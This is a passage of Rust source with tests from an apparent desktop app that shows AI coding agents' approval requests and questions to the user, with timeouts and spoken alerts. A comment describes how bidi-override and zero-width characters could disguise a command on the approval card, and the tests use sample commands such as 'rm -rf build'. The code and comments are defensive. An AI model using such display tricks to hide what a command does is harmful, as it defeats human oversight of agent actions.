/// renders as if PingMyBell were not installed).
async fn post_question(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    body: Bytes,
) -> axum::response::Response {
    use axum::response::IntoResponse;

    if !authorized(&headers, &state.token) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    let (mut event, questions, tool_use_id) = match parse_question_body(&body) {
        Ok(parsed) => parsed,
        Err(err) => {
            log::warn!("dropping malformed question payload: {err}");
            return StatusCode::BAD_REQUEST.into_response();
        }
    };

    // No card, no answer: never park a request nobody can resolve.
    if !QUESTION_UI_READY || state.overlay.is_none() {
        log::info!("question skipped: no overlay card available, deferring to terminal");
        return StatusCode::NO_CONTENT.into_response();
    }

    // The question text is what the board/history and the callout show; clean
    // it like any other summary (§9.4 — bounded, derived data only).
    event.summary = event
        .summary
        .take()
        .and_then(|raw| non_empty(summarize::clean(&raw)))
        .or_else(|| non_empty(summarize::clean(&questions[0].question)));
    let spoken = event.summary.clone().unwrap_or_default();

    let (session, event_id) = match state.registry.apply(&event, |snapshot| {
        if let Err(err) = state.app.emit("session-updated", snapshot) {
            log::warn!("failed to emit session-updated: {err}");
        }
    }) {
        Ok(applied) => applied,
        Err(err) => {
            log::error!("registry failed to apply question event: {err}");
            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
        }
    };

    // Base park for a question nobody touches; extendable up to the ceiling
    // while the user is demonstrably answering (see `TYPING_EXTENSION` and
    // the `keep_question_alive` command).
    let deadline = Arc::new(Deadline::new(approval_timeout(), question_max_park()));
    let (info, rx) = state.broker.register_question(
        QuestionInfo {
            id: String::new(),
            session_id: session.id.clone(),
            event_id,
            agent: event.agent,
            title: session.title.clone(),
            tool_use_id,
            questions,
        },
        deadline.clone(),
    );
    let _cleanup = QuestionCleanup {
        id: info.id.clone(),
        session_id: session.id.clone(),
        event_id: info.event_id,
        app: Some(state.app.clone()),
        broker: state.broker.clone(),
        overlay: state.overlay.clone(),
        registry: state.registry.clone(),
    };
    log::info!(
        "question {} pending: {} question(s) in session {}",
        info.id,
        info.questions.len(),
        info.session_id
    );

    if let Some(overlay) = &state.overlay {
        overlay.pin_question(info.clone());
    }
    // Preempting announcement, same priority as an approval: the agent is
    // blocked until this is answered.
    state.speaker.enqueue(Utterance {
        priority: Priority::Approval,
        session_id: session.id.clone(),
        agent: event.agent,
        text: speaker::callout(
            crate::config::speech_style(),
            speaker::Callout::Attention { summary: &spoken },
            event.agent,
            &info.title,
        ),
        voice_override: None,
        audition: false,
    });

    let outcome = park_until(rx, &deadline, |armed_for| {
        state.broker.expire_question_if_due(&info.id, armed_for)
    })
    .await;

    match outcome {
        Some(QuestionOutcome::Answered(answer)) => {
            log::info!(
                "question {} answered ({} of {} question(s))",
                info.id,
                answer.answers.len(),
                info.questions.len()
            );
            // Close the window HERE rather than leaving it to the command
            // that answered: this handler can wake and drop its cleanup guard
            // first, and that guard's expiry notice would otherwise flash
            // "this question timed out" over an answer the user just sent.
            // Clearing the prompt now makes the guard a no-op. Idempotent.
            crate::reply::close_for(&state.app, &info.id);
            axum::Json(answer).into_response()
        }
        // The user chose "answer in the terminal": they are done with our UI,
        // so the reply window goes away with the card.
        Some(QuestionOutcome::Deferred) => {
            log::info!("question {} deferred to terminal", info.id);
            if let Some(overlay) = &state.overlay {
                overlay.unpin_question(&info.id);
            }
            crate::reply::close_for(&state.app, &info.id);
            StatusCode::NO_CONTENT.into_response()
        }
        // Ran out of time even after every extension. The card goes, but a
        // reply window that is still open KEEPS whatever the user typed —
        // closing it out from under them is the bug this whole path exists
        // to fix.
        None => {
            log::info!("question {} unanswered; falling back to terminal", info.id);
            if let Some(overlay) = &state.overlay {
                overlay.unpin_question(&info.id);
            }
            crate::reply::expire_for(&state.app, &info.id);
            StatusCode::NO_CONTENT.into_response()
        }
    }
}

/// Park on a broker receiver until the UI resolves it or the deadline fires.
///
/// The deadline is re-read every time it fires rather than being baked into
/// one `sleep`: that is what lets a question stay alive while the user is
/// still typing an answer into the reply window. An approval passes a
/// `Deadline::fixed`, so its behaviour is exactly the single sleep it always
/// was.
///
/// `expire` runs when the timer wins and must report whether the entry was
/// still pending (i.e. WE won). If the UI grabbed it in the race window its
/// send is already on the way, so we wait one grace period rather than
/// throwing away a click the user already made. Shared by the approval and
/// question paths so the subtle part exists exactly once.
async fn park_until<T>(
    rx: tokio::sync::oneshot::Receiver<T>,
    deadline: &Deadline,
    expire: impl Fn(tokio::time::Instant) -> Expiry,
) -> Option<T> {
    let mut rx = rx;
    loop {
        let at = deadline.at();
        let sleep = tokio::time::sleep_until(at);
        tokio::pin!(sleep);
        tokio::select! {
            res = &mut rx => return res.ok(),
            // `expire` is handed the deadline we armed for and re-checks it
            // under the broker lock, so an extension landing in the moment
            // the timer fires is never lost.
            _ = &mut sleep => match expire(at) {
                Expiry::Extended => continue,
                Expiry::Expired => return None,
                Expiry::Raced => {
                    return (tokio::time::timeout(RACE_GRACE, &mut rx).await)
                        .ok()
                        .and_then(Result::ok)
                }
            },
        }
    }
}

/// One line of card.
const TOOL_SUMMARY_CHARS: usize = 160;

/// The primary input worth showing for a tool call (AC-6.1), truncated for
/// the card. Derived data — never logged (§9).
fn tool_summary(tool_name: &str, input: &serde_json::Value) -> String {
    let primary = match tool_name {
        // Codex uses Claude Code's hook-facing name for every exec flavour
        // (shell and unified_exec both report `Bash`), and puts the command
        // line in the same field — so this arm serves both agents unchanged.
        "Bash" => input["command"].as_str().unwrap_or_default().to_string(),
        "Write" | "Edit" | "MultiEdit" => {
            input["file_path"].as_str().unwrap_or_default().to_string()
        }
        // Codex file changes. `input.command` is the raw `*** Begin Patch …`
        // text, which is useless on a one-line card — show what it TOUCHES.
        "apply_patch" => patch_summary(input["command"].as_str().unwrap_or_default()),
        _ => serde_json::to_string(input).unwrap_or_default(),
    };
    // This is the string the user is authorizing — the one surface where
    // "what it renders as" and "what will run" must be the same thing. A bidi
    // override in here reverses the tail of the command on the card while the
    // agent executes the original, and zero-width padding pushes the real
    // command past the cap. One pass closes both: the 160 characters kept are
    // 160 VISIBLE ones, and the ellipsis (load-bearing here — it is what says
    // "there is more command than this") reports what that pass actually
    // dropped.
    let (mut out, truncated) = summarize::sanitize_capped(&primary, TOOL_SUMMARY_CHARS);
    if truncated {
        out.push('…');
    }
    out
}

/// Reduce a Codex `apply_patch` body to the files it changes, e.g.
/// `Add src/main.rs, Update README.md`. Falls back to the raw text when the
/// patch does not use the envelope we know — the card showing something odd
/// beats the card showing nothing.
fn patch_summary(patch: &str) -> String {
    /// Six files named on one card is already more than anyone reads.
    const MAX_FILES: usize = 6;

    let mut parts: Vec<String> = Vec::new();
    let mut more = false;
    for line in patch.lines() {
        let line = line.trim();
        let Some(rest) = line.strip_prefix("*** ") else {
            continue;
        };
        for (prefix, verb) in [
            ("Add File:", "Add"),
            ("Update File:", "Update"),
            ("Delete File:", "Delete"),
            ("Move to:", "Move to"),
        ] {
            if let Some(path) = rest.strip_prefix(prefix) {
                let path = path.trim();
                if !path.is_empty() {
                    // Only say "…" once we have SEEN a file we are not
                    // showing — appending it on the sixth would claim there
                    // are hidden files when there are exactly six.
                    if parts.len() == MAX_FILES {
                        more = true;
                    } else {
                        parts.push(format!("{verb} {path}"));
                    }
                }
                break;
            }
        }
        if more {
            break;
        }
    }
    if more {
        parts.push("…".into());
    }
    if parts.is_empty() {
        // Unrecognized envelope: show the head of it rather than nothing.
        // Bounded here as well as by the caller's cap, so a megabyte of diff
        // is never fully walked just to keep 160 characters.
        patch.split_whitespace().take(60).collect::<Vec<_>>().join(" ")
    } else {
        parts.join(", ")
    }
}

fn non_empty(s: String) -> Option<String> {
    (!s.is_empty()).then_some(s)
}

/// Turn a registry event into a voice callout (AC-2.2, AC-2.3). The summary
/// was already cleaned at ingress; it is derived data — never logged (§9).
fn dispatch_callout(speaker: &SpeakerHandle, event: &NormalizedEvent, session: &Session) {
    let summary = event.summary.as_deref().unwrap_or_default();
    // Read once per callout, not cached: a style change must reach the very
    // next thing spoken, and this is not a hot path.
    let style = crate::config::speech_style();
    let (priority, text) = match event.event {
        EventKind::TurnComplete => (
            Priority::Completion,
            speaker::callout(
                style,
                speaker::Callout::Completion { summary },
                event.agent,
                &session.title,
            ),
        ),
        EventKind::NeedsAttention | EventKind::PermissionRequest => (
            Priority::Attention,
            speaker::callout(
                style,
                speaker::Callout::Attention { summary },
                event.agent,
                &session.title,
            ),
        ),
        // A turn starting is a state change, not news: it must move the dot
        // back to working without speaking or raising a card.
        EventKind::SessionStart | EventKind::TurnStart | EventKind::SessionEnd => return,
    };
    speaker.enqueue(Utterance {
        priority,
        session_id: session.id.clone(),
        agent: event.agent,
        text,
        voice_override: None,
        audition: false,
    });
}

/// One reminder for a session left waiting too long (§11.4). Off by default.
///
/// Armed by the very event that starts the wait rather than by a poll loop
/// (AC-5.5): the app already spawns one-shot timers for toast collapse, and a
/// sweep that wakes every N seconds to find nothing is exactly the idle load
/// this app promises not to have.
fn arm_reminder(state: &Arc<AppState>, event: &NormalizedEvent, session: &Session) {
    if !matches!(
        event.event,
        EventKind::NeedsAttention | EventKind::PermissionRequest
    ) {
        return;
    }
    let Some(after) = crate::config::remind_after_secs() else {
        return;
    };
    let state = Arc::clone(state);
    let session_id = session.id.clone();
    let agent = event.agent;
    // The park stamped this; if it has moved when the timer fires, this wait
    // is over and whatever is waiting now is a DIFFERENT one with a timer of
    // its own. That is also what makes this fire at most once per wait.
    let parked_at = session.last_event_at;
    tauri::async_runtime::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(after)).await;
        // The registry mutex is held across the daily prune's VACUUM and the
        // WAL checkpoint, so even this one lookup belongs off the async
        // workers that agents are parked against.
        let lookup = {
            let registry = state.registry.clone();
            let session_id = session_id.clone();
            tauri::async_runtime::spawn_blocking(move || registry.get(&session_id)).await
        };
        let Ok(Some(current)) = lookup else {
            return;
        };
        if current.state != crate::registry::SessionState::NeedsAttention
            || current.last_event_at != parked_at
        {
            return;
        }
        log::info!("reminder: {session_id} has been waiting {after}s");
        state.speaker.enqueue(Utterance {
            priority: Priority::Attention,
            // Distinct from the session's own callouts so the 5 s per-session
            // dedup cannot swallow a reminder that is minutes late by design.
            session_id: format!("remind-{session_id}"),
            agent,
            text: format!("Still waiting in {}.", current.title),
            voice_override: None,
            audition: false,
        });
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::broker::{Answer, AnswerResult, QuestionAnswer, QuestionInfo};
    use crate::registry::SessionState;
    use std::time::Duration;

    /// A registry on a real (temporary) database — `Registry::open` is the
    /// only constructor visible from here.
    fn test_registry() -> (Arc<Registry>, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        let registry = Registry::open(&dir.path().join("t.db"), crate::titles::TitleIndex::empty())
            .expect("registry must open");
        // The TempDir is returned so it outlives the database file.
        (Arc::new(registry), dir)
    }

    fn normalized(kind: &str, session_id: &str) -> NormalizedEvent {
        serde_json::from_value(serde_json::json!({
            "agent": "claude-code",
            "event": kind,
            "session_id": session_id,
            "cwd": "/tmp/pmb",
        }))
        .unwrap()
    }

    /// Park a session on the user, the way `/v1/approval` does.
    fn parked_session(registry: &Registry, session_id: &str) {
        let (session, _) = registry
            .apply(&normalized("permission_request", session_id), |_| {})
            .unwrap();
        assert_eq!(session.state, SessionState::NeedsAttention);
    }

    /// Real budgets, compressed ~1000x so the tests exercise the same code
    /// paths in milliseconds. The RATIOS are what matters: base < ceiling,
    /// and both outlast the RACE_GRACE window.
    const TEST_BASE: Duration = Duration::from_millis(120);
    const TEST_CEILING: Duration = Duration::from_millis(600);

    fn test_deadline() -> Arc<Deadline> {
        Arc::new(Deadline::new(TEST_BASE, TEST_CEILING))
    }

    /// The verified AskUserQuestion PreToolUse payload (claude 2.1.198),
    /// wrapped in the normalized-event envelope the shim sends.
    fn question_body(questions: serde_json::Value) -> Vec<u8> {
        serde_json::json!({
            "agent": "claude-code",
            "event": "needs_attention",
            "session_id": "4018aba2-7f8c-4733-bcfa-d1ab7e41033c",
            "cwd": "/tmp/ask-spike",
            "summary": "Do you prefer option A (fast) or option B (thorough)?",
            "transcript_path": "/tmp/t.jsonl",
            "tool": null,
            "terminal": null,
            "tool_use_id": "toolu_01Cvj9QuwXtaGg2Yezug3EQ1",
            "questions": questions,
        })
        .to_string()
        .into_bytes()
    }

    fn one_question() -> serde_json::Value {
        serde_json::json!([{
            "question": "Do you prefer option A (fast) or option B (thorough)?",
            "header": "Approach",
            "options": [
                {"label": "Option A (fast)", "description": "Quicker turnaround, less depth."},
                {"label": "Option B (thorough)", "description": "Slower but more comprehensive."}
            ],
            "multiSelect": false
        }])
    }

    #[test]
    fn parses_the_verified_payload() {
        let (event, questions, tool_use_id) = parse_question_body(&question_body(one_question()))
            .expect("verified payload must parse");
        assert_eq!(event.agent, AgentKind::ClaudeCode);
        assert_eq!(event.event, EventKind::NeedsAttention);
        assert_eq!(event.session_id, "4018aba2-7f8c-4733-bcfa-d1ab7e41033c");
        assert_eq!(
            tool_use_id.as_deref(),
            Some("toolu_01Cvj9QuwXtaGg2Yezug3EQ1")
        );
        assert_eq!(questions.len(), 1);
        assert_eq!(questions[0].header, "Approach");
        assert_eq!(questions[0].options.len(), 2);
        assert!(!questions[0].multi_select);
    }

    #[test]
    fn rejects_schema_invalid_bodies() {
        // Not JSON / not an event at all.
        assert!(parse_question_body(b"not json").is_err());
        assert!(parse_question_body(b"{}").is_err());
        // Event envelope fine, questions missing or empty.
        assert!(parse_question_body(&question_body(serde_json::json!([]))).is_err());
        assert!(parse_question_body(&question_body(serde_json::json!("nope"))).is_err());
        // Question object without the required text.
        assert!(parse_question_body(&question_body(serde_json::json!([{"header": "h"}]))).is_err());
        assert!(parse_question_body(&question_body(
            serde_json::json!([{"question": "   ", "options": [{"label": "a"}]}])
        ))
        .is_err());
        // A question nobody can answer (no options, or only blank ones) falls
        // back to the terminal instead of parking a dead card.
        assert!(
            parse_question_body(&question_body(serde_json::json!([{"question": "q?"}]))).is_err()
        );
        assert!(parse_question_body(&question_body(serde_json::json!([
            {"question": "q?", "options": [{"label": "  "}, {"label": ""}]}
        ])))
        .is_err());
        // Absurd question count → terminal fallback rather than a monster card.
        let many: Vec<_> = (0..MAX_QUESTIONS + 1)
            .map(|i| serde_json::json!({"question": format!("q{i}"), "options": [{"label": "a"}]}))
            .collect();
        assert!(parse_question_body(&question_body(serde_json::json!(many))).is_err());
    }

    #[test]
    fn caps_and_trims_hostile_strings() {
        let long = "x".repeat(5000);
        let mut options: Vec<_> = (0..MAX_OPTIONS)
            .map(|_| serde_json::json!({"label": "   ", "description": ""}))
            .collect();
        options.extend(
            (0..40).map(
                |i| serde_json::json!({"label": format!("opt{i}"), "description": long.clone()}),
            ),
        );
        let body = question_body(serde_json::json!([{
            "question": long.clone(),
            "header": long.clone(),
            "options": options,
            "multiSelect": true
        }]));
        let (_, questions, _) = parse_question_body(&body).unwrap();
        assert_eq!(questions[0].question.chars().count(), MAX_QUESTION_CHARS);
        assert_eq!(questions[0].header.chars().count(), MAX_HEADER_CHARS);
        assert_eq!(questions[0].options.len(), MAX_OPTIONS);
        assert_eq!(
            questions[0].options[0].label, "opt0",
            "blank options are dropped before the count cap, not after"
        );
        assert_eq!(
            questions[0].options[0].description.chars().count(),
            MAX_DESCRIPTION_CHARS
        );
        assert!(questions[0].multi_select);
    }

    #[test]
    fn missing_optional_fields_are_tolerated() {
        // No header, no descriptions, no multiSelect, no tool_use_id.
        let mut body: serde_json::Value =
            serde_json::from_slice(&question_body(serde_json::json!([{
                "question": "Ship it?",
                "options": [{"label": "Yes"}, {"label": "No"}]
            }])))
            .unwrap();
        body.as_object_mut().unwrap().remove("tool_use_id");
        let (_, questions, tool_use_id) = parse_question_body(body.to_string().as_bytes()).unwrap();
        assert!(tool_use_id.is_none());
        assert_eq!(questions[0].header, "");
        assert!(!questions[0].multi_select);
        assert_eq!(questions[0].options[0].description, "");
    }

    fn parked_question() -> QuestionInfo {
        QuestionInfo {
            id: String::new(),
            session_id: "s1".into(),
            event_id: 1,
            agent: AgentKind::ClaudeCode,
            title: "ask-spike".into(),
            tool_use_id: None,
            questions: parse_question_body(&question_body(one_question()))
                .unwrap()
                .1,
        }
    }

    #[tokio::test]
    async fn parked_question_times_out_into_terminal_fallback() {
        let broker = Arc::new(Broker::default());
        let deadline = Arc::new(Deadline::new(
            Duration::from_millis(20),
            Duration::from_millis(20),
        ));
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());

        // Same code path as the 110 s park, compressed for the test.
        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert!(outcome.is_none(), "timeout must yield 204, not an answer");
        assert!(
            !broker.has_pending_for_session("s1"),
            "the timed-out question is gone from the broker"
        );
    }

    #[tokio::test]
    async fn answered_question_resolves_the_park() {
        let broker = Arc::new(Broker::default());
        let deadline = test_deadline();
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());

        let answering = {
            let broker = broker.clone();
            let id = info.id.clone();
            tokio::spawn(async move {
                tokio::time::sleep(std::time::Duration::from_millis(20)).await;
                broker.answer(
                    &id,
                    QuestionAnswer {
                        answers: vec![Answer {
                            question_index: 0,
                            labels: vec!["Option B (thorough)".into()],
                            free_text: None,
                        }],
                    },
                )
            })
        };
        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert!(matches!(
            answering.await.unwrap(),
            AnswerResult::Accepted(_)
        ));
        match outcome {
            Some(QuestionOutcome::Answered(answer)) => {
                assert_eq!(answer.answers[0].labels, vec!["Option B (thorough)"]);
                // This is exactly the 200 body the shim parses.
                assert_eq!(
                    serde_json::to_string(&answer).unwrap(),
                    r#"{"answers":[{"question_index":0,"labels":["Option B (thorough)"],"free_text":null}]}"#
                );
            }
            other => panic!("expected an answer, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn deferred_question_falls_through_immediately() {
        let broker = Arc::new(Broker::default());
        let deadline = test_deadline();
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());
        assert!(broker.defer_question(&info.id).is_some());

        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert_eq!(outcome, Some(QuestionOutcome::Deferred));
    }

    /// The budgets have to nest, or the agent kills the hook before we ever
    /// answer. Hard-coded on purpose: these numbers are a contract with
    /// `shim/src/main.rs` (570 s read timeout) and the installers (600 s hook
    /// timeout), which cannot import them.
    #[test]
    fn park_budgets_nest_inside_the_hook_timeout() {
        const SHIM_QUESTION_READ_TIMEOUT_SECS: u64 = 570;
        const INSTALLED_HOOK_TIMEOUT_SECS: u64 = 600;

        const { assert!(APPROVAL_TIMEOUT_SECS < QUESTION_MAX_PARK_SECS) };
        const { assert!(QUESTION_MAX_PARK_SECS < SHIM_QUESTION_READ_TIMEOUT_SECS) };
        const { assert!(SHIM_QUESTION_READ_TIMEOUT_SECS < INSTALLED_HOOK_TIMEOUT_SECS) };
        // An approval must still fit inside the shim's own 115 s budget.
        const { assert!(APPROVAL_TIMEOUT_SECS < 115) };

        // Approvals nest the same way one rung shorter. The Codex numbers are
        // read from the installer's OWN table rather than restated, so
        // shortening a hook timeout there fails here instead of silently
        // letting Codex kill the shim mid-park.
        const SHIM_APPROVAL_READ_TIMEOUT_SECS: u64 = 115;
        let codex = |event: &str| {
            pingmybell_installers::codex::HOOKS
                .iter()
                .find(|(name, ..)| *name == event)
                .map(|(_, _, _, timeout, _)| *timeout)
                .expect("installer must still write this event")
        };
        assert!(
            APPROVAL_TIMEOUT_SECS < SHIM_APPROVAL_READ_TIMEOUT_SECS
                && SHIM_APPROVAL_READ_TIMEOUT_SECS < codex("PermissionRequest"),
            "Codex approval budgets must nest: {APPROVAL_TIMEOUT_SECS} < \
             {SHIM_APPROVAL_READ_TIMEOUT_SECS} < {}",
            codex("PermissionRequest")
        );
        assert!(
            QUESTION_MAX_PARK_SECS < SHIM_QUESTION_READ_TIMEOUT_SECS
                && SHIM_QUESTION_READ_TIMEOUT_SECS < codex("PreToolUse"),
            "Codex question budgets must nest"
        );
    }

    /// The card has one line for "what is this?". For a Codex file change
    /// that line must be the files, not four hundred characters of diff.
    #[test]
    fn codex_tool_summaries_show_the_command_and_the_touched_files() {
        // Codex reports every exec flavour under Claude's `Bash` name with
        // the command in the same field, so this arm already served it.
        assert_eq!(
            tool_summary(
                "Bash",
                &serde_json::json!({"command": "curl -sS https://example.com -o /dev/null"})
            ),
            "curl -sS https://example.com -o /dev/null"
        );

        // The verified apply_patch payload.
        assert_eq!(
            tool_summary(
                "apply_patch",
                &serde_json::json!({
                    "command": "*** Begin Patch\n*** Add File: canary.txt\n+PMB_PATCH_CANARY\n*** End Patch"
                })
            ),
            "Add canary.txt"
        );

        assert_eq!(
            patch_summary(
                "*** Begin Patch\n*** Update File: src/a.rs\n-old\n+new\n*** Delete File: b.txt\n*** End Patch"
            ),
            "Update src/a.rs, Delete b.txt"
        );

        // A patch body we do not recognize still shows SOMETHING.
        assert_eq!(patch_summary("just  some\ntext"), "just some text");

        // Exactly six files must NOT claim there are more; seven must.
        let patch_of = |n: usize| {
            (0..n).fold("*** Begin Patch\n".to_string(), |mut acc, i| {
                acc.push_str(&format!("*** Add File: f{i}.rs\n"));
                acc
            })
        };
        assert_eq!(
            patch_summary(&patch_of(6)),
            "Add f0.rs, Add f1.rs, Add f2.rs, Add f3.rs, Add f4.rs, Add f5.rs",
            "six files are all of them — no ellipsis"
        );
        assert!(
            patch_summary(&patch_of(7)).ends_with(", …"),
            "a seventh file must be announced as hidden"
        );

        // The 160-char cap is real and lands on a char boundary. Multi-byte
        // on purpose: byte slicing here would panic.
        let long_path = "é".repeat(300);
        let out = tool_summary(
            "apply_patch",
            &serde_json::json!({"command": format!("*** Begin Patch\n*** Add File: {long_path}\n")}),
        );
        assert_eq!(out.chars().count(), 161, "160 chars plus the ellipsis: {out}");
        assert!(out.ends_with('…'), "{out}");
        assert!(out.starts_with("Add éé"), "{out}");

        // Same for a plain Bash command, which is the common case.
        let long_cmd = "echo ".to_string() + &"ü".repeat(400);
        let capped = tool_summary("Bash", &serde_json::json!({"command": long_cmd}));
        assert_eq!(capped.chars().count(), 161, "{capped}");
    }

    /// Approvals are deliberately NOT extendable: nothing in the UI may hold
    /// a routine tool call open past its fixed park.
    #[tokio::test]
    async fn approval_park_cannot_be_extended() {
        let deadline = Deadline::fixed(Duration::from_millis(30));
        let at = deadline.at();
        assert_eq!(deadline.extend(Duration::from_secs(600)), at);

        let broker = Arc::new(Broker::default());
        let (info, rx) = broker.register(ApprovalInfo {
            id: String::new(),
            session_id: "s1".into(),
            event_id: 1,
            agent: AgentKind::ClaudeCode,
            title: "ask-spike".into(),
            tool_name: "Bash".into(),
            tool_summary: "cargo test".into(),
        });
        let decision = park_until(rx, &deadline, |_| {
            if broker.expire(&info.id).is_some() {
                Expiry::Expired
            } else {
                Expiry::Raced
            }
        })
        .await;
        assert!(decision.is_none(), "a fixed park times out on schedule");
    }

    /// The bug this whole change exists for: the user opens the reply window
    /// and keeps typing past the base park. Heartbeats must keep the question
    /// alive instead of letting it die mid-sentence.
    #[tokio::test]
    async fn typing_keeps_a_question_alive_past_the_base_park() {
        let broker = Arc::new(Broker::default());
        let deadline = test_deadline();
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());

        // Beat every ~40 ms across a 120 ms base park, then answer at ~200 ms
        // — comfortably past the point the old fixed park would have died.
        let heart = {
            let broker = broker.clone();
            let id = info.id.clone();
            tokio::spawn(async move {
                for _ in 0..5 {
                    tokio::time::sleep(Duration::from_millis(40)).await;
                    if broker.extend_question(&id, TEST_BASE).is_none() {
                        return false; // died while "typing" — the old bug
                    }
                }
                broker.answer(
                    &id,
                    QuestionAnswer {
                        answers: vec![Answer {
                            question_index: 0,
                            labels: vec![],
                            free_text: Some("a long typed answer".into()),
                        }],
                    },
                );
                true
            })
        };

        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert!(heart.await.unwrap(), "the park must survive the typing");
        match outcome {
            Some(QuestionOutcome::Answered(answer)) => assert_eq!(
                answer.answers[0].free_text.as_deref(),
                Some("a long typed answer")
            ),
            other => panic!("typing must not lose the question, got {other:?}"),
        }
    }

    /// The other half of the contract: extensions are bounded. Past the
    /// ceiling the park ends no matter how hard the UI beats, because beyond
    /// it the AGENT would kill the hook — and then the shim's fallback, not
    /// ours, decides what happens.
    #[tokio::test]
    async fn extension_never_outlives_the_ceiling() {
        let broker = Arc::new(Broker::default());
        let deadline = Arc::new(Deadline::new(
            Duration::from_millis(30),
            Duration::from_millis(150),
        ));
        let ceiling = deadline.ceiling();
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());

        // A heartbeat that never gives up: it must NOT be able to park forever.
        let heart = {
            let broker = broker.clone();
            let id = info.id.clone();
            tokio::spawn(async move {
                let mut beats = 0u32;
                while broker
                    .extend_question(&id, Duration::from_secs(3600))
                    .is_some()
                {
                    beats += 1;
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
                beats
            })
        };

        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert!(
            outcome.is_none(),
            "past the ceiling the park must end in the 204 terminal fallback"
        );
        assert!(
            tokio::time::Instant::now() >= ceiling,
            "it must not end EARLY either — the ceiling is the whole budget"
        );
        assert!(heart.await.unwrap() > 0, "the heartbeat really did run");
        assert!(!broker.has_pending_for_session("s1"));
    }

    /// Fail-open survives the new machinery: a question that runs out of time
    /// even after extensions still resolves to the 204 the shim turns into
    /// "print nothing, exit 0" (PRD AC-2.4).
    #[tokio::test]
    async fn expiry_still_fails_open_after_extensions() {
        let broker = Arc::new(Broker::default());
        let deadline = Arc::new(Deadline::new(
            Duration::from_millis(20),
            Duration::from_millis(120),
        ));
        let (info, rx) = broker.register_question(parked_question(), deadline.clone());

        // One extension (the user opened the reply window), then silence —
        // they walked away mid-answer.
        assert!(broker
            .extend_question(&info.id, Duration::from_millis(60))
            .is_some());

        let outcome = park_until(rx, &deadline, |armed_for| {
            broker.expire_question_if_due(&info.id, armed_for)
        })
        .await;
        assert!(outcome.is_none(), "no answer means 204, never a fabricated one");
        assert!(!broker.has_pending_for_session("s1"));
        // And it is really over: a late heartbeat cannot revive it.
        assert!(broker
            .extend_question(&info.id, Duration::from_secs(60))
            .is_none());
    }

    #[tokio::test]
    async fn cleanup_guard_expires_a_park_abandoned_by_the_shim() {
        // Simulates `kill -9` on the agent: the handler future is dropped
        // mid-park, so the guard must free the broker entry (and, once wired,
        // unpin the card) instead of stranding it.
        let broker = Arc::new(Broker::default());
        let (registry, _dir) = test_registry();
        parked_session(&registry, "s1");
        let (info, _rx) = broker.register_question(parked_question(), test_deadline());
        {
            let _cleanup = QuestionCleanup {
                id: info.id.clone(),
                session_id: "s1".into(),
                event_id: 0,
                app: None,
                broker: broker.clone(),
                overlay: None,
                registry: registry.clone(),
            };
        }
        assert!(!broker.has_pending_for_session("s1"));
        assert!(broker.expire_question(&info.id).is_none());
        // …and the row stops claiming the user still owes it an answer. The
        // guard hands that off to a blocking task, so give it a moment.
        assert!(
            wait_for_working(&registry, "s1").await,
            "an abandoned park must release the session"
        );
    }

    /// Poll for the state the guard's spawned task will publish. Cheap enough
    /// to be generous: a wrong answer here fails, it does not hang.
    async fn wait_for_working(registry: &Registry, session_id: &str) -> bool {
        for _ in 0..200 {
            if registry.get(session_id).map(|s| s.state) == Some(SessionState::Working) {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        false
    }

    /// The approval guard owes the same release — this is the `kill -9`
    /// case for a tool call rather than a question.
    #[tokio::test]
    async fn an_abandoned_approval_releases_the_session_too() {
        let broker = Arc::new(Broker::default());
        let (registry, _dir) = test_registry();
        parked_session(&registry, "s1");
        let (info, _rx) = broker.register(ApprovalInfo {
            id: String::new(),
            session_id: "s1".into(),
            event_id: 1,
            agent: AgentKind::ClaudeCode,
            title: "ask-spike".into(),
            tool_name: "Bash".into(),
            tool_summary: "cargo test".into(),
        });
        {
            let _cleanup = ApprovalCleanup {
                id: info.id.clone(),
                session_id: "s1".into(),
                event_id: info.event_id,
                broker: broker.clone(),
                overlay: None,
                registry: registry.clone(),
                app: None,
            };
        }
        assert!(!broker.has_pending_for_session("s1"));
        assert!(wait_for_working(&registry, "s1").await);
    }

    /// The release must not resurrect a session that has legitimately moved
    /// on, and must not speak for a sibling card that is still up.
    #[test]
    fn releasing_attention_respects_siblings_and_sessions_that_moved_on() {
        let broker = Arc::new(Broker::default());
        let (registry, _dir) = test_registry();
        parked_session(&registry, "s1");

        // A second approval is still parked for the same session: it owns the
        // attention state until IT ends.
        let (sibling, _rx) = broker.register(ApprovalInfo {
            id: String::new(),
            session_id: "s1".into(),
            event_id: 2,
            agent: AgentKind::ClaudeCode,
            title: "ask-spike".into(),
            tool_name: "Bash".into(),
            tool_summary: "rm -rf build".into(),
        });
        release_attention_now("s1", None, &registry, &broker, None);
        assert_eq!(
            registry.get("s1").map(|s| s.state),
            Some(SessionState::NeedsAttention),
            "a card still on screen must keep the row waiting"
        );

        // Sibling gone: now the release lands.
        assert!(broker.expire(&sibling.id).is_some());
        release_attention_now("s1", None, &registry, &broker, None);
        assert_eq!(
            registry.get("s1").map(|s| s.state),
            Some(SessionState::Working)
        );

        // A session that has since finished its turn must not be dragged
        // back to "working" by a late guard.
        registry
            .apply(&normalized("turn_complete", "s2"), |_| {})
            .unwrap();
        release_attention_now("s2", None, &registry, &broker, None);
        assert_eq!(registry.get("s2").map(|s| s.state), Some(SessionState::Done));

